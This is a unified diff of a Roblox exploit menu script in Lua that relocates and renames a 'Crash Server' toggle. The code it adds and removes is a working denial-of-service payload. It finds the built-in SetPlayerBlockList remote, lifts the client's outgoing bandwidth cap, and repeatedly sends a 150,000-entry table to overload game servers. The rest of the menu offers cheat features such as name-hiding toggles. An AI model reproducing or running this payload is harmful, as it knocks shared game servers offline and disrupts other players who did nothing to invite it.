@@ -11,6 +11,7 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
@@ -72,6 +73,11 @@ if OldGui then
 	OldGui:Destroy()
 end
 
+local OldCrashGui = PlayerGui:FindFirstChild("CrashServerUI")
+if OldCrashGui then
+	OldCrashGui:Destroy()
+end
+
 --//======================================================
 --// COLORS
 --//======================================================
@@ -117,7 +123,7 @@ local Fonts = {
 }
 
 --//======================================================
---// SCREEN GUI
+--// SCREEN GUI (MAIN)
 --//======================================================
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -383,8 +389,8 @@ end
 local NameColorButton   = MakeButton("NAME COLOR: OFF", 55)
 local FastLvlHiderButton = MakeButton("FAST LVL HIDER: OFF", 93)
 
---// rxt button (crash server toggle)
-local RxtButton = MakeButton("Crash Server❗: OFF", 131)
+--// Crash Server button (toggle on/off, source embedded below)
+local CrashServerButton = MakeButton("Crash Server ❗❗: OFF", 131)
 
 local Status = Instance.new("TextLabel")
 Status.Size = UDim2.new(1, -24, 0, 18)
@@ -401,6 +407,137 @@ local FontButton          = MakeButton("FONT CHANGER: OFF", 196)
 local InvisibleNameButton = MakeButton("INVISIBLE NAME: 0/6", 234)
 local CoffeeButton        = MakeButton("☕ GET COFFEE", 272)
 local DiscordButton       = MakeButton("☁ JOIN DISCORD", 310, 28)
+
+--//======================================================
+--// CRASH SERVER SOURCE (embedded inside the button)
+--//======================================================
+
+local CrashSource = [==[
+local RunService = game:GetService("RunService")
+
+local Children       = 150000
+local NestedPerChild = 0
+local FieldsPerChild = 0
+local FireBurst      = 1
+local FrameDelay     = 0.125
+local FieldSize      = 0
+local RebuildEach    = false
+
+local state = {
+    running = false,
+    thread  = nil,
+    remote  = nil,
+    cache   = nil,
+    pad     = "",
+}
+
+local function resolve()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local r = rrs:FindFirstChild("SetPlayerBlockList")
+    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
+        return r
+    end
+    return nil
+end
+
+state.remote = resolve()
+
+pcall(function()
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+
+state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+
+local function build()
+    local root = table.create(Children)
+    for i = 1, Children do
+        local entry = { id = i, v = i * 2 }
+        for k = 1, FieldsPerChild do
+            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
+        end
+        for j = 1, NestedPerChild do
+            entry["n" .. j] = { a = i, b = j }
+        end
+        root[i] = entry
+    end
+    return root
+end
+
+local function fire()
+    if not state.remote then
+        state.remote = resolve()
+        if not state.remote then return end
+    end
+    local payload
+    if RebuildEach or not state.cache then
+        payload = build()
+        if not RebuildEach then state.cache = payload end
+    else
+        payload = state.cache
+    end
+    for _ = 1, FireBurst do
+        state.remote:FireServer(payload)
+    end
+end
+
+local function start()
+    if state.running then return end
+    state.running = true
+    state.cache = nil
+    state.thread = task.spawn(function()
+        while state.running do
+            pcall(fire)
+            if FrameDelay > 0 then
+                task.wait(FrameDelay)
+            else
+                RunService.Heartbeat:Wait()
+            end
+        end
+    end)
+end
+
+local function stop()
+    state.running = false
+    if state.thread then pcall(task.cancel, state.thread) end
+    state.thread = nil
+    state.cache = nil
+end
+
+return {
+    start  = start,
+    stop   = stop,
+    toggle = function() if state.running then stop() else start() end end,
+    isRunning = function() return state.running end,
+}
+]==]
+
+local CrashAPI = nil
+do
+    local chunk = loadstring(CrashSource)
+    if chunk then
+        local ok, result = pcall(chunk)
+        if ok and type(result) == "table" then
+            CrashAPI = result
+        end
+    end
+end
+
+local CrashEnabled = false
+
+CrashServerButton.MouseButton1Click:Connect(function()
+    if not CrashAPI then return end
+
+    CrashEnabled = not CrashEnabled
+
+    if CrashEnabled then
+        CrashServerButton.Text = "Crash Server ❗❗: ON"
+        pcall(CrashAPI.start)
+    else
+        CrashServerButton.Text = "Crash Server ❗❗: OFF"
+        pcall(CrashAPI.stop)
+    end
+end)
 
 --//======================================================
 --// SECRET COMMANDS PANEL
@@ -907,139 +1044,6 @@ FastLvlHiderButton.MouseButton1Click:Connect(function()
 end)
 
 --//======================================================
---// rxt BUTTON — CRASH SERVER TOGGLE
---// (loaded from the crash-server source, toggled on click)
---//======================================================
-
-local CrashSource = [==[
-local RunService = game:GetService("RunService")
-
-local Children       = 150000
-local NestedPerChild = 0
-local FieldsPerChild = 0
-local FireBurst      = 1
-local FrameDelay     = 0.125
-local FieldSize      = 0
-local RebuildEach    = false
-
-local state = {
-    running = false,
-    thread  = nil,
-    remote  = nil,
-    cache   = nil,
-    pad     = "",
-}
-
-local function resolve()
-    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
-    if not rrs then return nil end
-    local r = rrs:FindFirstChild("SetPlayerBlockList")
-    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
-        return r
-    end
-    return nil
-end
-
-state.remote = resolve()
-
-pcall(function()
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-end)
-
-state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
-
-local function build()
-    local root = table.create(Children)
-    for i = 1, Children do
-        local entry = { id = i, v = i * 2 }
-        for k = 1, FieldsPerChild do
-            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
-        end
-        for j = 1, NestedPerChild do
-            entry["n" .. j] = { a = i, b = j }
-        end
-        root[i] = entry
-    end
-    return root
-end
-
-local function fire()
-    if not state.remote then
-        state.remote = resolve()
-        if not state.remote then return end
-    end
-    local payload
-    if RebuildEach or not state.cache then
-        payload = build()
-        if not RebuildEach then state.cache = payload end
-    else
-        payload = state.cache
-    end
-    for _ = 1, FireBurst do
-        state.remote:FireServer(payload)
-    end
-end
-
-local function start()
-    if state.running then return end
-    state.running = true
-    state.cache = nil
-    state.thread = task.spawn(function()
-        while state.running do
-            pcall(fire)
-            if FrameDelay > 0 then
-                task.wait(FrameDelay)
-            else
-                RunService.Heartbeat:Wait()
-            end
-        end
-    end)
-end
-
-local function stop()
-    state.running = false
-    if state.thread then pcall(task.cancel, state.thread) end
-    state.thread = nil
-    state.cache = nil
-end
-
-return {
-    start  = start,
-    stop   = stop,
-    toggle = function() if state.running then stop() else start() end end,
-    isRunning = function() return state.running end,
-}
-]==]
-
-local CrashAPI = nil
-
-do
-	local chunk = loadstring(CrashSource)
-	if chunk then
-		local ok, result = pcall(chunk)
-		if ok and type(result) == "table" then
-			CrashAPI = result
-		end
-	end
-end
-
-local CrashEnabled = false
-
-RxtButton.MouseButton1Click:Connect(function()
-	if not CrashAPI then return end
-
-	CrashEnabled = not CrashEnabled
-
-	if CrashEnabled then
-		RxtButton.Text = "rxt: ON"
-		pcall(CrashAPI.start)
-	else
-		RxtButton.Text = "rxt: OFF"
-		pcall(CrashAPI.stop)
-	end
-end)
-
---//======================================================
 --// NAME COLOR
 --//======================================================
 
@@ -1147,7 +1151,7 @@ DiscordButton.MouseButton1Click:Connect(function()
 end)
 
 --//======================================================
---// DRAG
+--// DRAG (MAIN + SECRET)
 --//======================================================
 
 local function MakeDraggable(Object)
